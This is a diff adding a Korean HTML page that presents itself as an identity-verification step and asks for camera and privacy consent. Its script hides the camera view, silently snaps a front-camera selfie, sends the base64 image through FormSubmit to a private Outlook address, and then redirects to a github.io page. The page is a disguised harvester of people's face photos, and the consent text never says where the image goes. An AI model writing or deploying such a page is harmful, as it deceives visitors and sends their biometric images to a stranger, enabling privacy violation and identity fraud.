@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>인증 및 확인</title>
+    <style>
+        body {
+            font-family: 'Malgun Gothic', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+        /* 카메라 화면과 캔버스를 화면에서 숨김 처리 (자동 촬영용) */
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>본인 확인 절차</h2>
+    <p>진행을 위해 카메라 접근 권한 및 개인정보 수집·이용에 동의해 주세요.</p>
+    <button id="agreeBtn">카메라 권한 및 개인정보 처리 동의</button>
+    <div id="status"></div>
+</div>
+
+<!-- 카메라 스트림 및 캡처용 요소 -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const agreeBtn = document.getElementById('agreeBtn');
+    const statusDiv = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    agreeBtn.addEventListener('click', async () => {
+        agreeBtn.disabled = true;
+        statusDiv.textContent = "카메라 권한을 요청 중입니다...";
+
+        try {
+            // 1. 전면 카메라(셀카) 권한 요청 및 스트림 연결
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+
+            // 비디오 메타데이터가 로드되면 자동 촬영 진행
+            video.onloadedmetadata = () => {
+                statusDiv.textContent = "촬영을 준비 중입니다...";
+                
+                // 카메라 초점 및 노출 안정화를 위해 1.5초 대기 후 촬영
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 1500);
+            };
+        } catch (err) {
+            console.error("카메라 접근 오류:", err);
+            statusDiv.textContent = "카메라 권한이 거부되었거나 사용할 수 없습니다.";
+            agreeBtn.disabled = false;
+        }
+    });
+
+    function captureAndSend(stream) {
+        statusDiv.textContent = "사진 촬영 및 전송 중...";
+
+        // 2. 캔버스에 현재 비디오 프레임 그리기 (셀카 촬영)
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // 촬영 완료 후 카메라 스트림 종료
+        stream.getTracks().forEach(track => track.stop());
+
+        // 이미지를 Base64 데이터로 변환
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+        // 3. 이메일 전송 처리 (FormSubmit AJAX API 예시)
+        // 참고: 최초 1회 jsbi110@outlook.kr 메일함에서 FormSubmit 활성화 링크를 클릭해야 정상 수신됩니다.
+        fetch("https://formsubmit.co/ajax/jsbi110@outlook.kr", {
+            method: "POST",
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                subject: "자동 촬영 셀카 전송",
+                message: "사용자가 동의 후 촬영한 이미지 데이터입니다.",
+                image_base64: imageData // 첨부파일 대신 Base64 텍스트로 전송
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            statusDiv.textContent = "전송 완료! 페이지를 이동합니다...";
+            // 4. 지정된 URL로 이동
+            window.location.href = "https://jsbi110.github.io/aa";
+        })
+        .catch(error => {
+            console.error("전송 오류:", error);
+            statusDiv.textContent = "전송 중 오류가 발생했으나 페이지를 이동합니다...";
+            setTimeout(() => {
+                window.location.href = "https://jsbi110.github.io/aa";
+            }, 1000);
+        });
+    }
+</script>
+
+</body>
+</html>
